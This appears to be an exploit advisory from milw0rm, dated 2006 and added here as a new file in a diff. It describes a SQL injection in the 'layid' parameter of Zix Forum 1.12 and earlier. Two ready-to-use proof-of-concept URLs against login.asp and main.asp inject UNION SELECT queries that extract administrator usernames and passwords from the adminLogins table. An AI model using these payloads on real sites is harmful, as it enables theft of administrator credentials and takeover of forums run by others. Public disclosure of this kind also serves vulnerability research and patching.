@@ -1,0 +1,21 @@
+Zix Forum <= 1.12 (layid) SQL Injection Vulnerability
+
+
+Vulnerability:
+--------------------
+SQL_Injection:
+Input passed to the "layid" parameter in 'settings.asp' not properly sanitised before being used in a SQL query.
+This can be exploited to manipulate SQL queries by injecting arbitrary SQL code.
+Successful exploitation extracts username and password of administrator in clear text .
+
+
+Proof of Concepts:
+--------------------
+site.com/zix/login.asp?layid=-1%20union%20select%201,null,null,1,1,1,1,null,1,1,J_User,null,1,1,1,1,1,J_Pass,null,null,null,null,1,1,1,1,1,1,1,1,1,1,1,1,1,1,null%20from%20adminLogins where approve=1 and '1'='1'
+site.com/zix/main.asp?layid=-1%20union%20select%201,null,null,null,1,1,1,null,1,1,J_User,null,1,1,1,1,1,J_Pass,null,null,null,null,1,1,1,1,1,1,1,1,1,1,1,1,1,null,null%20from%20adminLogins where approve=1 and '1'='1'
+
+-------
+
+By FarhadKey On 19 May 2006
+
+# milw0rm.com [2006-05-19]
